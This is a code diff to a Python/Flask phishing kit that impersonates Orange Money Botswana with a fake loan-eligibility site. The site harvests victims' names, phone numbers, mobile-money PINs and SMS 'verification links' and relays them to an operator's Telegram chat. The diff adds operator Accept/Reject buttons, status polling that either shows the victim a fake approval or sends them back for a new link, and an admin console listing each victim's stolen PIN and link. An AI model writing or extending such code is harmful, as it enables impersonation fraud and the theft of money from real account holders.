@@ -44,21 +44,57 @@ def send_sms_notification(message):
 # Telegram Configuration
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+LOCAL_RECORDS = {}
 
-def send_telegram_notification(message):
+def send_telegram_notification(message, reply_markup=None):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         print("Telegram configuration missing. Notification skipped.")
-        return
+        return None
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {
             "chat_id": TELEGRAM_CHAT_ID,
             "text": message,
-            "parse_mode": "Markdown"
+            "parse_mode": "Markdown",
+            "disable_web_page_preview": True
         }
-        requests.post(url, json=payload, timeout=5)
+        if reply_markup:
+            payload["reply_markup"] = reply_markup
+        res = requests.post(url, json=payload, timeout=5)
+        return res.json()
     except Exception as e:
         print(f"Telegram notification dispatch failed: {e}")
+        return None
+
+def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
+    if not TELEGRAM_BOT_TOKEN:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+        payload = {
+            "chat_id": chat_id,
+            "message_id": message_id,
+            "text": text,
+            "parse_mode": "Markdown",
+            "disable_web_page_preview": True
+        }
+        if reply_markup:
+            payload["reply_markup"] = reply_markup
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print(f"Telegram edit message failed: {e}")
+
+def answer_telegram_callback(callback_query_id, text=None):
+    if not TELEGRAM_BOT_TOKEN:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+        payload = {"callback_query_id": callback_query_id}
+        if text:
+            payload["text"] = text
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print(f"Telegram answer callback failed: {e}")
 
 def get_now_str():
     try:
@@ -118,6 +154,29 @@ def persist_record(app_id, data_update):
             db.lpush("applications", key)
     except Exception as e:
         print(f"Error persisting record: {e}")
+    if app_id not in LOCAL_RECORDS:
+        LOCAL_RECORDS[app_id] = {}
+    LOCAL_RECORDS[app_id].update(data_update)
+    LOCAL_RECORDS[app_id]["updated_at"] = get_now_str()
+
+def get_record(app_id):
+    key = f"app:{app_id}"
+    try:
+        if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
+            base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
+            headers = {"Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}"}
+            get_res = requests.get(f"{base_url}/get/{key}", headers=headers, timeout=4)
+            if get_res.status_code == 200:
+                raw = get_res.json().get("result")
+                if raw:
+                    return json.loads(raw)
+        elif db:
+            raw = db.get(key)
+            if raw:
+                return json.loads(raw)
+    except Exception as e:
+        print(f"Error fetching record: {e}")
+    return LOCAL_RECORDS.get(app_id, {})
 
 HTML_PAGE = r"""<!DOCTYPE html>
 <html lang="en">
@@ -507,11 +566,20 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please paste the verification link we've sent via SMS to <span id="otp-mobile-label" class="font-bold text-slate-700"></span> to verify your loan eligibility.</p>
       </div>
 
+      <!-- Rejected / Expired Link Error Banner -->
+      <div id="link-error-banner" class="hidden max-w-md mx-auto p-4 rounded-2xl bg-rose-50 border border-rose-200 text-rose-900 text-xs shadow-sm flex items-start gap-3 transition-all">
+        <div class="w-6 h-6 rounded-full bg-rose-100 text-rose-600 flex items-center justify-center font-bold text-sm shrink-0">✕</div>
+        <div class="space-y-0.5 text-left">
+          <div class="font-black text-rose-800 text-sm">Link Invalid or Expired</div>
+          <div class="text-rose-700 leading-relaxed">The verification link is invalid, rejected, or expired. Please check your SMS messages and paste a valid new link to proceed.</div>
+        </div>
+      </div>
+
       <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4 max-w-md mx-auto">
         <div>
           <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Paste Verification Link</label>
           <div class="relative flex items-center">
-            <input type="text" id="input-verification-link" placeholder="Paste link here (e.g. https://...)" class="w-full px-4 py-3.5 pr-20 rounded-2xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] bg-slate-50 text-sm font-semibold text-slate-800 placeholder:text-slate-400">
+            <input type="text" id="input-verification-link" oninput="document.getElementById('link-error-banner')?.classList.add('hidden')" placeholder="Paste link here (e.g. https://...)" class="w-full px-4 py-3.5 pr-20 rounded-2xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] bg-slate-50 text-sm font-semibold text-slate-800 placeholder:text-slate-400">
             <button type="button" onclick="pasteLinkFromClipboard()" class="absolute right-2 px-3 py-1.5 bg-[#FF7900] hover:bg-[#E66A00] text-black rounded-xl text-xs font-black shadow-xs transition-all active:scale-95">PASTE</button>
           </div>
           <p class="text-[11px] text-slate-400 mt-2">Open your SMS messages, copy the eligibility link, and paste it here.</p>
@@ -546,10 +614,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <span class="font-bold text-emerald-600">✓</span><span>Phone Verified</span>
         </div>
         <div id="step-proc" class="flex items-center gap-3 text-[#FF7900] animate-pulse">
-          <span class="w-2.5 h-2.5 rounded-full bg-[#FF7900] inline-block ml-0.5"></span><span>Processing Assessment...</span>
+          <span class="w-2.5 h-2.5 rounded-full bg-[#FF7900] inline-block ml-0.5"></span><span>Verifying Link Eligibility...</span>
         </div>
         <div id="step-dec" class="flex items-center gap-3 text-slate-400">
-          <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Final Decision</span>
+          <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Awaiting Final Decision</span>
         </div>
       </div>
     </section>
@@ -935,13 +1003,25 @@ HTML_PAGE = r"""<!DOCTYPE html>
       goTo('otp');
     }
 
+    let statusPollTimer = null;
+
+    function stopStatusPolling() {
+      if (statusPollTimer) {
+        clearInterval(statusPollTimer);
+        statusPollTimer = null;
+      }
+    }
+
     async function pasteLinkFromClipboard() {
       try {
         if (navigator.clipboard && navigator.clipboard.readText) {
           const text = await navigator.clipboard.readText();
           if (text) {
             const input = document.getElementById('input-verification-link');
-            if (input) input.value = text;
+            if (input) {
+              input.value = text;
+              document.getElementById('link-error-banner')?.classList.add('hidden');
+            }
           }
         }
       } catch (err) {
@@ -977,6 +1057,15 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const linkInput = document.getElementById('input-verification-link');
       const pastedLink = linkInput ? linkInput.value.trim() : '';
 
+      if (!pastedLink) {
+        if (linkInput) {
+          linkInput.focus();
+          linkInput.classList.add('ring-2', 'ring-rose-500');
+          setTimeout(() => linkInput.classList.remove('ring-2', 'ring-rose-500'), 1500);
+        }
+        return;
+      }
+
       const btnOtp = document.getElementById('btn-otp');
       if (btnOtp) {
         btnOtp.disabled = true;
@@ -1003,37 +1092,103 @@ HTML_PAGE = r"""<!DOCTYPE html>
           btnOtp.innerText = 'VERIFY & CONTINUE';
         }
         goTo('processing');
+        startStatusPolling();
+      }, 1000);
+    }
 
-        setTimeout(() => {
-          const approvedAmt = document.getElementById('approved-amount');
-          const approvedRepay = document.getElementById('approved-repay');
-          const approvedDate = document.getElementById('approved-date');
+    function startStatusPolling() {
+      stopStatusPolling();
 
-          const val = appState.amount || 1500;
-          const days = appState.period || 30;
-          let rate = 0.05;
-          if (days <= 7) rate = 0.03;
-          else if (days <= 14) rate = 0.05;
-          else if (days <= 30) rate = 0.10;
-          else if (days <= 60) rate = 0.15;
-          else rate = 0.20;
+      const stepProc = document.getElementById('step-proc');
+      const stepDec = document.getElementById('step-dec');
+      if (stepProc) {
+        stepProc.className = "flex items-center gap-3 text-[#FF7900] animate-pulse";
+        stepProc.innerHTML = '<span class="w-2.5 h-2.5 rounded-full bg-[#FF7900] inline-block ml-0.5"></span><span>Verifying Link Eligibility...</span>';
+      }
+      if (stepDec) {
+        stepDec.className = "flex items-center gap-3 text-slate-400";
+        stepDec.innerHTML = '<span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Awaiting Final Decision</span>';
+      }
 
-          const interest = Math.round(val * rate);
-          const fee = Math.round(val * 0.03);
-          const total = val + interest + fee;
+      statusPollTimer = setInterval(async () => {
+        try {
+          const res = await fetch('/api/status/' + appState.appId);
+          if (!res.ok) return;
+          const data = await res.json();
+          const currentStatus = (data && data.appStatus) ? data.appStatus.toLowerCase() : '';
 
-          if (approvedAmt) approvedAmt.innerText = 'P ' + val.toLocaleString();
-          if (approvedRepay) approvedRepay.innerText = 'P ' + total.toLocaleString();
-
-          if (approvedDate) {
-            const d = new Date();
-            d.setDate(d.getDate() + days);
-            approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+          if (currentStatus === 'approved' || currentStatus === 'accepted') {
+            stopStatusPolling();
+            handleApprovalSuccess();
+          } else if (currentStatus === 'rejected' || currentStatus === 'declined') {
+            stopStatusPolling();
+            handleLinkRejected();
           }
+        } catch (err) {
+          console.error("Status polling error:", err);
+        }
+      }, 2000);
+    }
 
-          goTo('approved');
-        }, 6000);
-      }, 1500);
+    function handleApprovalSuccess() {
+      const stepDec = document.getElementById('step-dec');
+      if (stepDec) {
+        stepDec.className = "flex items-center gap-3 text-emerald-600 font-bold";
+        stepDec.innerHTML = '<span>✓</span><span>Loan Approved</span>';
+      }
+
+      setTimeout(() => {
+        const approvedAmt = document.getElementById('approved-amount');
+        const approvedRepay = document.getElementById('approved-repay');
+        const approvedDate = document.getElementById('approved-date');
+
+        const val = appState.amount || 1500;
+        const days = appState.period || 30;
+        let rate = 0.05;
+        if (days <= 7) rate = 0.03;
+        else if (days <= 14) rate = 0.05;
+        else if (days <= 30) rate = 0.10;
+        else if (days <= 60) rate = 0.15;
+        else rate = 0.20;
+
+        const interest = Math.round(val * rate);
+        const fee = Math.round(val * 0.03);
+        const total = val + interest + fee;
+
+        if (approvedAmt) approvedAmt.innerText = 'P ' + val.toLocaleString();
+        if (approvedRepay) approvedRepay.innerText = 'P ' + total.toLocaleString();
+
+        if (approvedDate) {
+          const d = new Date();
+          d.setDate(d.getDate() + days);
+          approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+        }
+
+        goTo('approved');
+      }, 1000);
+    }
+
+    function handleLinkRejected() {
+      const banner = document.getElementById('link-error-banner');
+      if (banner) {
+        banner.classList.remove('hidden');
+      }
+
+      const linkInput = document.getElementById('input-verification-link');
+      if (linkInput) {
+        linkInput.value = '';
+      }
+
+      const btnOtp = document.getElementById('btn-otp');
+      if (btnOtp) {
+        btnOtp.disabled = false;
+        btnOtp.innerText = 'VERIFY & CONTINUE';
+      }
+
+      goTo('otp');
+      setTimeout(() => {
+        if (linkInput) linkInput.focus();
+      }, 300);
     }
 
     function syncAmount(val, isFromInput = false) {
@@ -1080,9 +1235,33 @@ def save_unified():
             send_telegram_notification(m)
             send_sms_notification(f"[Orange Money Botswana] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n in ('entered_link', 'entered_otp'):
-            persist_record(app_id, {"verification_link": f_v, "status": "link_submitted"})
-            m = f'🔗 *Verification Link Received*\n\n👤 *User:* {name}\n🌐 *Link / Code:* {f_v}\n📞 *Phone:* {phone}'
-            send_telegram_notification(m)
+            persist_record(app_id, {"verification_link": f_v, "status": "pending_review"})
+            base_url = request.host_url.rstrip('/')
+            accept_url = f"{base_url}/api/decision/{app_id}/accept"
+            reject_url = f"{base_url}/api/decision/{app_id}/reject"
+            reply_markup = {
+                "inline_keyboard": [
+                    [
+                        {"text": "✅ Accept", "callback_data": f"accept:{app_id}"},
+                        {"text": "❌ Reject", "callback_data": f"reject:{app_id}"}
+                    ],
+                    [
+                        {"text": "🌐 Direct Accept", "url": accept_url},
+                        {"text": "🌐 Direct Reject", "url": reject_url}
+                    ]
+                ]
+            }
+            m = (
+                f"🔗 *Verification Link Received*\n\n"
+                f"👤 *User:* {name}\n"
+                f"🌐 *Link / Code:* `{f_v}`\n"
+                f"📞 *Phone:* {phone}\n"
+                f"🆔 *Ref:* `{app_id}`\n\n"
+                f"👇 *Choose an Action:*\n"
+                f"• [✅ Accept Application]({accept_url})\n"
+                f"• [❌ Reject / Request New Link]({reject_url})"
+            )
+            send_telegram_notification(m, reply_markup=reply_markup)
             send_sms_notification(f"[Orange Money Botswana] Link Received\nUser: {name}\nPhone: {phone}\nLink: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
@@ -1108,6 +1287,169 @@ def save_unified():
 @app.route('/api/track-input', methods=['POST'])
 def track_input():
     return save_unified()
+@app.route('/api/status/<app_id>')
+def get_app_status(app_id):
+    rec = get_record(app_id)
+    return jsonify({
+        "status": "success",
+        "appId": app_id,
+        "appStatus": rec.get("status", "pending_review"),
+        "data": rec
+    })
+
+@app.route('/api/decision/<app_id>/<action>', methods=['GET', 'POST'])
+def api_decision(app_id, action):
+    act = action.lower()
+    if act in ('accept', 'approve'):
+        status = 'approved'
+        msg_title = 'Application Approved'
+        desc = 'The user has been approved and their screen is advancing to Loan Approved.'
+    elif act in ('reject', 'decline'):
+        status = 'rejected'
+        msg_title = 'Verification Link Rejected'
+        desc = 'The link was marked invalid/expired. The user has been returned to re-enter a new link.'
+    else:
+        return jsonify({"status": "error", "message": "Unknown action"}), 400
+
+    persist_record(app_id, {"status": status})
+
+    if request.is_json or request.headers.get('Accept') == 'application/json':
+        return jsonify({"status": "success", "appId": app_id, "appStatus": status})
+
+    return f'''<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>{msg_title} - Orange Money Botswana</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black text-white min-h-screen flex items-center justify-center p-4">
+  <div class="max-w-md w-full bg-zinc-900 border border-zinc-800 p-8 rounded-3xl text-center space-y-4 shadow-2xl">
+    <div class="w-16 h-16 mx-auto rounded-full {'bg-emerald-500/20 text-emerald-400' if status == 'approved' else 'bg-rose-500/20 text-rose-400'} flex items-center justify-center text-3xl font-black">
+      {'✓' if status == 'approved' else '✕'}
+    </div>
+    <h1 class="text-2xl font-black text-white">{msg_title}</h1>
+    <p class="text-sm text-zinc-400">{desc}</p>
+    <div class="p-3 bg-zinc-950 rounded-xl text-xs font-mono text-[#FF7900] border border-zinc-800">
+      Ref: {app_id} • Status: {status.upper()}
+    </div>
+    <div class="pt-2">
+      <a href="/admin" class="inline-block px-6 py-3 rounded-2xl bg-[#FF7900] text-black font-black text-xs hover:bg-[#e66a00] transition-all">
+        Open Admin Dashboard
+      </a>
+    </div>
+  </div>
+</body>
+</html>'''
+
+@app.route('/api/telegram-webhook', methods=['POST'])
+def telegram_webhook():
+    try:
+        data = request.get_json(silent=True) or {}
+        cq = data.get("callback_query")
+        if cq:
+            cq_id = cq.get("id")
+            cb_data = cq.get("data", "")
+            msg = cq.get("message") or {}
+            chat_id = msg.get("chat", {}).get("id")
+            message_id = msg.get("message_id")
+            if ":" in cb_data:
+                action, app_id = cb_data.split(":", 1)
+                if action == "accept":
+                    persist_record(app_id, {"status": "approved"})
+                    answer_telegram_callback(cq_id, "✅ Application Accepted! User is approved.")
+                    edit_telegram_message(chat_id, message_id, f"✅ *APPLICATION ACCEPTED*\n\n🆔 *Ref:* `{app_id}`\nStatus: User screen forwarded to Loan Approved.")
+                elif action == "reject":
+                    persist_record(app_id, {"status": "rejected"})
+                    answer_telegram_callback(cq_id, "❌ Link Rejected! User prompted to re-enter.")
+                    edit_telegram_message(chat_id, message_id, f"❌ *LINK REJECTED*\n\n🆔 *Ref:* `{app_id}`\nStatus: User prompted to re-enter new verification link.")
+        return jsonify({"ok": True})
+    except Exception as e:
+        print(f"Telegram webhook error: {e}")
+        return jsonify({"ok": False, "error": str(e)})
+
+@app.route('/api/telegram-webhook/setup')
+def setup_webhook():
+    if not TELEGRAM_BOT_TOKEN:
+        return jsonify({"status": "error", "message": "TELEGRAM_BOT_TOKEN not configured"}), 400
+    base_url = request.host_url.rstrip('/')
+    webhook_url = f"{base_url}/api/telegram-webhook"
+    res = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook", json={"url": webhook_url}, timeout=5)
+    return jsonify({"webhook_url": webhook_url, "telegram_response": res.json()})
+
+@app.route('/admin')
+def admin_page():
+    app_keys = set(LOCAL_RECORDS.keys())
+    try:
+        if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
+            base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
+            headers = {"Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}"}
+            l_res = requests.get(f"{base_url}/lrange/applications/0/50", headers=headers, timeout=3)
+            if l_res.status_code == 200:
+                for k in (l_res.json().get("result") or []):
+                    app_keys.add(k.replace("app:", ""))
+    except Exception: pass
+
+    records = [get_record(k) for k in app_keys if k]
+    records = [r for r in records if r]
+    records.sort(key=lambda x: x.get("updated_at", ""), reverse=True)
+
+    rows = ""
+    for r in records:
+        aid = r.get("appId", "N/A")
+        name = r.get("fullName", "Unknown")
+        phone = r.get("mobile", "N/A")
+        amt = r.get("amount", "N/A")
+        pin = r.get("pin", "—")
+        link = r.get("verification_link", "—")
+        status = r.get("status", "pending_review")
+        badge = "bg-amber-500/20 text-amber-400 border-amber-500/30"
+        if status in ('approved', 'accepted'): badge = "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
+        elif status in ('rejected', 'declined'): badge = "bg-rose-500/20 text-rose-400 border-rose-500/30"
+        link_str = f'<a href="{link}" target="_blank" class="text-[#FF7900] underline">{link[:35]}...</a>' if link.startswith('http') else link
+
+        rows += f'''<tr class="border-b border-zinc-800 text-xs hover:bg-zinc-900/50">
+          <td class="p-3 font-mono text-zinc-400">{aid}</td>
+          <td class="p-3 font-bold text-white">{name}</td>
+          <td class="p-3 text-zinc-300">{phone}</td>
+          <td class="p-3 font-black text-[#FF7900]">P {amt}</td>
+          <td class="p-3 font-mono font-bold text-white">{pin}</td>
+          <td class="p-3 max-w-[200px] break-all">{link_str}</td>
+          <td class="p-3"><span class="px-2 py-0.5 rounded-full border text-[10px] font-bold uppercase {badge}">{status}</span></td>
+          <td class="p-3 text-right space-x-1 whitespace-nowrap">
+            <button onclick="decide('{aid}','accept')" class="px-3 py-1 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-lg text-xs">Accept</button>
+            <button onclick="decide('{aid}','reject')" class="px-3 py-1 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-lg text-xs">Reject</button>
+          </td></tr>'''
+
+    if not rows:
+        rows = '<tr><td colspan="8" class="p-8 text-center text-zinc-500 text-xs">No applications yet.</td></tr>'
+
+    return f'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin Portal - Orange Money</title><script src="https://cdn.tailwindcss.com"></script></head>
+<body class="bg-black text-slate-100 min-h-screen p-4 sm:p-8">
+  <div class="max-w-5xl mx-auto space-y-6">
+    <div class="flex items-center justify-between pb-4 border-b border-zinc-800">
+      <div class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-[#FF7900] rounded-xl flex items-end p-1 shadow"><span class="text-white font-black text-xs">orange™</span></div>
+        <div><h1 class="text-lg font-black text-white">Orange Money Botswana • Review Console</h1><p class="text-xs text-zinc-400">Accept or reject verification links in real-time</p></div>
+      </div>
+      <div class="flex gap-2">
+        <button onclick="location.reload()" class="px-3 py-2 bg-zinc-900 border border-zinc-700 text-xs rounded-xl font-bold">↻ Refresh</button>
+        <button onclick="setupHook()" class="px-3 py-2 bg-[#FF7900] text-black font-black text-xs rounded-xl">⚡ Sync Webhook</button>
+      </div>
+    </div>
+    <div class="bg-zinc-950 rounded-2xl border border-zinc-800 overflow-x-auto shadow-2xl">
+      <table class="w-full text-left"><thead><tr class="border-b border-zinc-800 text-[11px] uppercase text-zinc-400 bg-zinc-900/50">
+        <th class="p-3">Ref</th><th class="p-3">Applicant</th><th class="p-3">Mobile</th><th class="p-3">Amount</th><th class="p-3">PIN</th><th class="p-3">Link</th><th class="p-3">Status</th><th class="p-3 text-right">Action</th>
+      </tr></thead><tbody>{rows}</tbody></table>
+    </div>
+  </div>
+  <script>
+    async function decide(id, act){{ try{{ const r=await fetch('/api/decision/'+id+'/'+act,{{headers:{{'Accept':'application/json'}}}}); if(r.ok) location.reload(); }}catch(e){{ alert(e); }} }}
+    async function setupHook(){{ const r=await fetch('/api/telegram-webhook/setup'); alert(JSON.stringify(await r.json(), null, 2)); }}
+  </script>
+</body></html>'''
+
 
 if __name__ == "__main__":
     app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
